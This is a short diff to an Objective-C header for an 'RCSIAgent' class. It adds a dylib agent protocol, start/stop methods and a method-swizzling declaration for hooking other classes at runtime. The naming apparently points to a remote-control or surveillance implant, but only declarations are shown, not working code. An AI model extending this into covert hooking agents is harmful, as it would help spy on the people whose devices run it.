@@ -7,7 +7,15 @@
 //
 
 #import <Foundation/Foundation.h>
+
 #import "RCSIThreadSupport.h"
+
+@protocol DylibAgents
+
+- (void)start;
+- (BOOL)stop;
+
+@end
 
 @interface RCSIAgent : NSObject
 {
@@ -18,10 +26,10 @@
 }
 
 @property (retain, readwrite) NSData *mAgentConfiguration;
-//@property (readwrite)         u_int   mAgentStatus;
 @property (readwrite)         u_int   mAgentID;
 @property (readwrite, retain) RCSIThread *mThread;
 
+- (id)init;
 - (id)initWithConfigData:(NSData*)aData;
 - (void)dealloc;
 
@@ -30,5 +38,13 @@
 
 - (BOOL)isThreadCancelled;
 - (void)cancelThread;
+
+- (BOOL)swizzleByAddingIMP:(Class)aClass 
+                   withSEL:(SEL)originalSEL
+            implementation:(IMP)newImplementation
+              andNewMethod:(SEL)newMethod;
+
+- (BOOL)start;
+- (void)stop;
 
 @end
